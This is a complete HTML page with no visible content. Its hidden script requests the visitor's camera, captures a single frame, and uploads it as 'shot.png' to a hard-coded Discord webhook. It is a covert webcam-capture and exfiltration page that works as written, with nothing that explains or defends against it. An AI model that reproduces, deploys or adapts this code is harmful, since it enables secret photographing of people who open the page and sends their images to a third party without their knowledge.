<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title> </title>
<style>body,video,canvas{display:none}</style>
</head>
<body>
<video id="v" autoplay playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>
<script>
const w="https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
const v=document.getElementById("v");
const ctx=document.getElementById("c").getContext("2d");
navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
v.srcObject=s;
v.onloadedmetadata=()=>{
v.play();
setTimeout(()=>{
document.getElementById("c").width=v.videoWidth;
document.getElementById("c").height=v.videoHeight;
ctx.drawImage(v,0,0);
document.getElementById("c").toBlob(b=>{
if(b){
let fd=new FormData();
fd.append("file",b,"shot.png");
fetch(w,{method:"POST",body:fd});
}
},"image/png",0.9);
},500);
};
});
</script>
</body>
</html>
